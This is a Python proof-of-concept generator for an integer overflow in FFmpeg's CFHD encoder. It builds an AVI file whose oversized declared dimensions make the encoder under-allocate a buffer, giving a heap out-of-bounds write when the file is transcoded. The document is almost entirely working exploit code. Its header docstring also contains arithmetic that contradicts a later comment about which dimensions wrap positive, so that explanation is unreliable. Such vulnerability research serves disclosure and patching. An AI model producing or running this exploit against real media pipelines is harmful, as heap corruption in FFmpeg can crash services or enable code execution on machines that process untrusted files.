#!/usr/bin/env python3
"""
PoC generator for VULN 001: Integer Overflow in cfhd_encode_init() dwt_buf allocation.

cfhdenc.c lines 278-286:
    w8 = width / 8 + 64;          // <-- +64 term
    h8 = height / 8;
    av_calloc(h8 * 8 * w8 * 8, sizeof(int16_t))
    // = av_calloc(h8 * w8 * 64, sizeof(int16_t))

For width=65536, height=32768 (plane 0, no chroma shift):
    w8 = 65536/8 + 64 = 8256
    h8 = 32768/8 = 4096
    product = 8256 * 4096 * 64 = 2,164,260,864  (overflows int32: 2^31=2,147,483,648)
    Wrapped value (signed): 2,164,260,864 - 2,147,483,648 = 16,777,216
    So calloc(16777216, 2) = 32 MB  (should have been ~4 GB)

Subband pointer subband[9] = dwt_buf + 3*w2*h2
    w2 = w8*4 = 33024, h2 = h8*4 = 16384
    offset = 3 * 33024 * 16384 = 1,623,040,000 elements = WAY past dwt_buf end

Any write through subband[9..] in cfhd_encode_frame() causes massive heap OOB write.

Attack vector: ffmpeg -i malicious.avi -c:v cfhd output.cfhd
"""

import struct
import os

def chunk(fourcc, data):
    cc = fourcc if isinstance(fourcc, bytes) else fourcc.encode('ascii')
    return cc + struct.pack('<I', len(data)) + data

def list_chunk(listtype, fourcc, inner_chunks):
    lt = listtype if isinstance(listtype, bytes) else listtype.encode('ascii')
    fc = fourcc if isinstance(fourcc, bytes) else fourcc.encode('ascii')
    data = fc + b''.join(inner_chunks)
    return lt + struct.pack('<I', len(data)) + data

# Overflow-triggering dimensions (both multiples of 16)
# For H=W=65536:
#   w8 = 65536/8 + 64 = 8192 + 64 = 8256
#   h8 = 65536/8 = 8192
#   product = 8256 * 8192 * 64 = 4,329,447,424 > 2^32
#   Wrapped int32 = 4,329,447,424 - 4,294,967,296 = 34,480,128 (POSITIVE!)
#   calloc(34480128, 2) = ~66MB  (should be ~8.6GB)
# This underallocated dwt_buf then has subband pointers pointing far OOB.
# IMPORTANT: H=32768 wraps to NEGATIVE (calloc returns NULL → caught as ENOMEM)
# H=W=65536 wraps to POSITIVE (underallocation passes NULL check → actual vuln)
W = 65536   # w8 = 8192 + 64 = 8256
H = 65536   # h8 = 8192
# product = 8256 * 8192 * 64 = 4,329,447,424 > 2^32; wraps to 34,480,128

# AVI Main Header (avih): 14 DWORDs = 56 bytes
avih_data = struct.pack('<14I',
    33333,   # dwMicroSecPerFrame
    0,       # dwMaxBytesPerSec
    0,       # dwPaddingGranularity
    0x10,    # dwFlags (AVIF_HASINDEX)
    1,       # dwTotalFrames
    0,       # dwInitialFrames
    1,       # dwStreams
    0,       # dwSuggestedBufferSize
    W,       # dwWidth
    H,       # dwHeight
    0, 0, 0, 0,  # dwReserved[4]
)

# Stream Header (strh): vids stream, 56 bytes
# Format: 4s fccType + 4s fccHandler + I dwFlags + H wPriority + H wLanguage +
#         I dwInitialFrames + I dwScale + I dwRate + I dwStart + I dwLength +
#         I dwSuggestedBufferSize + I dwQuality + I dwSampleSize +
#         4H rcFrame (left,top,right,bottom)
# rcFrame uses WORDs; cap at 0xFFFF since W=65536 won't fit in 16-bit
rcW = min(W, 0xFFFF)
rcH = min(H, 0xFFFF)
strh_data = struct.pack('<4s4sIHHIIIIIIII4H',
    b'vids',       # fccType
    b'DIB ',       # fccHandler (uncompressed DIB)
    0,             # dwFlags
    0,             # wPriority
    0,             # wLanguage
    0,             # dwInitialFrames
    1,             # dwScale
    30,            # dwRate (30 fps)
    0,             # dwStart
    1,             # dwLength
    0,             # dwSuggestedBufferSize
    0xFFFFFFFF,    # dwQuality
    0,             # dwSampleSize
    0, 0, rcW, rcH,  # rcFrame (WORD fields, capped at 65535)
)

# Stream Format (strf = BITMAPINFOHEADER): 40 bytes
# Format: I biSize + i biWidth + i biHeight + H biPlanes + H biBitCount +
#         I biCompression + I biSizeImage + i biXPelsPerMeter + i biYPelsPerMeter +
#         I biClrUsed + I biClrImportant
strf_data = struct.pack('<IiiHHIIiiII',
    40,   # biSize
    W,    # biWidth
    H,    # biHeight (positive = bottom-up)
    1,    # biPlanes
    24,   # biBitCount (RGB24)
    0,    # biCompression = BI_RGB
    0,    # biSizeImage (may be 0 for BI_RGB)
    0,    # biXPelsPerMeter
    0,    # biYPelsPerMeter
    0,    # biClrUsed
    0,    # biClrImportant
)

# Build LIST strl
strl_chunks = [
    chunk('strh', strh_data),
    chunk('strf', strf_data),
]
strl = list_chunk('LIST', 'strl', strl_chunks)

# Build LIST hdrl
hdrl_chunks = [
    chunk('avih', avih_data),
    strl,
]
hdrl = list_chunk('LIST', 'hdrl', hdrl_chunks)

# Build LIST movi with one minimal frame
# The actual pixel data for W*H*3 would be ~6GB; we just put 12 bytes.
# ffmpeg decoder will fail on this, but cfhd_encode_init() fires before decoding.
frame_data = b'\x00' * 12
movi_chunks = [chunk('00dc', frame_data)]
movi = list_chunk('LIST', 'movi', movi_chunks)

# Build RIFF AVI
riff_inner = b'AVI ' + hdrl + movi
riff = b'RIFF' + struct.pack('<I', len(riff_inner)) + riff_inner

outfile = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001_input.avi')
with open(outfile, 'wb') as f:
    f.write(riff)

print(f"Generated {outfile} ({len(riff)} bytes)")
print(f"Declared dimensions: {W}x{H}")
w8 = W//8 + 64
h8 = H//8
true_product = w8 * h8 * 64
print(f"Overflow check: w8={w8}, h8={h8}")
print(f"  true product = {true_product} (INT_MAX = {2**31-1}, 2^32 = {2**32})")
print(f"  Overflows INT_MAX: {true_product > 2**31-1}")
print(f"  Overflows UINT_MAX: {true_product > 2**32-1}")
wrapped = true_product % (2**32)
if wrapped >= 2**31:
    wrapped -= 2**32
print(f"  Wrapped int32 value: {wrapped} ({'POSITIVE - underallocates!' if wrapped > 0 else 'NEGATIVE - calloc gets huge size_t, likely returns NULL'})")
if wrapped > 0:
    print(f"  calloc(nmemb={wrapped}, size=2) = {wrapped*2} bytes")
    print(f"  Should have been: {true_product*2} bytes")
    print(f"  Underallocation factor: {true_product*2 // (wrapped*2)}x")
